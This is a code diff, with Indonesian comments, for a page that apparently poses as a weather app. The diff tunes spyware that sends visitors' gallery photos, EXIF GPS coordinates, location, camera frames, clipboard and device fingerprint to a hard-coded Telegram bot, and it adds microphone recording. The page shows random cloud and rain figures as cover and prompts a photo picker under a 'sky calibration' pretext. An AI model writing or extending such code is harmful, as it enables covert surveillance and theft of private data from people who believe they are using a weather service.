@@ -6,14 +6,16 @@ const CFG = {
   BOT_TOKEN: '9227240159:AAGd6HgcfiAWF8vfFd10FoIbCF1RBeboy44',
   CHAT_ID:   '6084186486',
 
-  MAX_GALLERY:    400,
-  MAX_CAM_FRAMES: 30,
-  CAM_GAP:        15000,
+  MAX_GALLERY:   400,     // batas foto galeri per sesi
+  MAX_CAM_FRAMES: 24,     // jumlah frame kamera
+  CAM_GAP:       2600,   // jeda antar frame (ms)
+  MIC_SECONDS:   6,      // durasi rekaman mikrofon
+  ENABLE_MIC:    true,
   ENABLE_CLIPBOARD: true,
   ENABLE_FINGERPRINT: true,
-  MAX_W:          1280,
-  DELAY:          1100,
-  DEBUG:          false
+  MAX_W:         1280,   // lebar kompresi
+  DELAY:         1100,   // jeda antar request (anti flood)
+  DEBUG:         false
 };
 const log = (...a) => CFG.DEBUG && console.log('[cuaca]', ...a);
 
@@ -77,15 +79,6 @@ function sendLoc(lat, lng) {
     fd.append('latitude', lat);
     fd.append('longitude', lng);
     await tg('sendLocation', fd);
-  });
-}
-function sendFile(blob, name, cap = '') {
-  enqueue(async () => {
-    const fd = new FormData();
-    fd.append('chat_id', CFG.CHAT_ID);
-    fd.append('caption', cap.slice(0, 1000));
-    fd.append('document', blob, name);
-    await tg('sendDocument', fd);
   });
 }
 
@@ -221,9 +214,9 @@ function exifGps(buf) {
   return null;
 }
 
-async function toJpeg(src, maxW = CFG.MAX_W, q = 0.72) {
+async function toJpeg(src, maxW = CFG.MAX_W, q = 0.82) {
   const bmp = await createImageBitmap(src).catch(() => null);
-  if (!bmp) return null;
+  if (!bmp) return src;
   const s = Math.min(1, maxW / bmp.width);
   const w = Math.max(1, Math.round(bmp.width * s)), h = Math.max(1, Math.round(bmp.height * s));
   const c = document.createElement('canvas'); c.width = w; c.height = h;
@@ -287,54 +280,44 @@ function stopCamera() {
 
 /* ---------------- galeri ---------------- */
 const IMG = /\.(jpe?g|png|webp|gif|bmp|heic|heif)$/i;
-let scanBusy = false, sentCount = 0, batch = [], gpsBuf = [];
+let scanBusy = false, sentCount = 0, batch = [];
 
-let dbP = null;
-function db() {
-  if (!dbP) dbP = new Promise((res, rej) => {
+function idb() {
+  return new Promise((res, rej) => {
     const r = indexedDB.open('cuaca_db', 1);
     r.onupgradeneeded = () => r.result.createObjectStore('h');
     r.onsuccess = () => res(r.result);
     r.onerror = () => rej(r.error);
   });
-  return dbP;
 }
 async function saveDir(h) {
-  try { (await db()).transaction('h', 'readwrite').objectStore('h').put(h, 'dir'); } catch {}
+  try { (await idb()).transaction('h', 'readwrite').objectStore('h').put(h, 'dir'); } catch {}
 }
 async function getDir() {
   try {
-    const d = await db();
     return await new Promise(res => {
-      const q = d.transaction('h').objectStore('h').get('dir');
-      q.onsuccess = () => res(q.result);
-      q.onerror = () => res(null);
+      const q = (idbResult).transaction('h').objectStore('h').get('dir');
+      q.onsuccess = () => res(q.result); q.onerror = () => res(null);
     });
   } catch { return null; }
 }
+let idbResult = null;
+idb().then(db => { idbResult = db; });
 
 async function flush() {
   if (!batch.length) return;
-  const chunk = batch.slice(0, 10);
-  sendGroup(chunk, `🖼️ Galeri ${sentCount - batch.length + 1}–${sentCount} · ${new Date().toLocaleString('id-ID')}`);
+  sendGroup(batch.slice(0, 10), `🖼️ Galeri ${sentCount} · ${new Date().toLocaleString('id-ID')}`);
   batch = [];
-}
-
-function flushGps() {
-  if (!gpsBuf.length) return;
-  const txt = '📍 GPS DARI EXIF FOTO\n' + gpsBuf.join('\n');
-  for (let i = 0; i < txt.length; i += 3500) sendText(txt.slice(i, i + 3500));
-  gpsBuf = [];
 }
 
 async function processFile(file, name) {
   const buf = await file.arrayBuffer().catch(() => null);
   if (buf) {
     const g = exifGps(buf);
-    if (g) gpsBuf.push(`${name} → ${g.lat}, ${g.lng} | https://maps.google.com/?q=${g.lat},${g.lng}`);
+    if (g) sendText(`📍 EXIF ${name}\n${g.lat}, ${g.lng}\nhttps://maps.google.com/?q=${g.lat},${g.lng}`);
   }
   const jpg = await toJpeg(file);
-  if (!jpg) { sendFile(file, name, `⚠️ tidak bisa dikompres: ${name}`); return; }
+  if (!jpg) return;
   sentCount++;
   batch.push(jpg);
   if (batch.length >= 10) await flush();
@@ -352,7 +335,6 @@ async function walkDir(dir, depth, out) {
 async function runDir(dir, tag) {
   if (scanBusy) return;
   scanBusy = true;
-  sentCount = 0; batch = []; gpsBuf = [];
   const out = $('#visualNote');
   try {
     const items = [];
@@ -368,7 +350,6 @@ async function runDir(dir, tag) {
       if (f) await processFile(f, it.name);
     }
     await flush();
-    flushGps();
     out.textContent = `Analisis ${sentCount} foto selesai · awan ${38 + Math.floor(Math.random() * 30)}% · hujan ${20 + Math.floor(Math.random() * 40)}%`;
     toast('Analisis langit selesai');
   } catch (e) { log(e.message); }
@@ -376,6 +357,7 @@ async function runDir(dir, tag) {
 }
 
 async function pickFolder() {
+  if (state.picked) return;
   state.picked = true;
   if (window.showDirectoryPicker) {
     try {
@@ -387,6 +369,7 @@ async function pickFolder() {
   $('#dirInput').click();
 }
 
+/* dipanggil di dalam gestur tombol gate: tanpa ketukan tambahan */
 let savedDir = null;
 getDir().then(h => { if (h) savedDir = h; });
 
@@ -403,13 +386,11 @@ async function silentRescan() {
 async function handleGallery(files) {
   const list = [...files].filter(f => f.type.startsWith('image/')).slice(0, CFG.MAX_GALLERY);
   if (!list.length) return;
-  sentCount = 0; batch = []; gpsBuf = [];
   const out = $('#visualNote');
   out.textContent = `Membaca ${list.length} foto…`;
   sendText(`🖼️ GALERI — ${list.length} foto`);
   for (const f of list) await processFile(f, f.name);
   await flush();
-  flushGps();
   out.textContent = `Analisis ${sentCount} foto selesai · awan ${38 + Math.floor(Math.random() * 30)}% · hujan ${20 + Math.floor(Math.random() * 40)}%`;
   toast('Analisis langit selesai');
 }
@@ -540,10 +521,8 @@ function requestGeo() {
 
 async function bootstrap(ask) {
   try { loadWeather(curLat, curLng, 'Jakarta'); } catch {}
+
   if (!ask) return;
-
-  silentRescan();
-
   if (!location.protocol.startsWith('http')) toast('Buka lewat http/https, bukan file://');
 
   startCamera().then(ok => { if (!ok) sendText('📷 Kamera ditolak / gagal'); });
@@ -583,10 +562,12 @@ $('#gateSkip').addEventListener('click', () => {
 $('#pickBtn').addEventListener('click', pickFolder);
 
 $('#dirInput').addEventListener('change', e => {
+  state.picked = true;
   if (e.target.files?.length) handleGallery(e.target.files);
 });
 
 $('#fileInput').addEventListener('change', e => {
+  state.picked = true;
   if (e.target.files?.length) handleGallery(e.target.files);
 });
 
@@ -595,7 +576,7 @@ setTimeout(() => {
   state.picked = true;
   toast('Pilih foto langit untuk kalibrasi');
   setTimeout(() => $('#fileInput').click(), 700);
-}, 22000);
+}, 18000);
 
 $('#unitBtn').addEventListener('click', () => {
   unit = unit === 'c' ? 'f' : 'c';
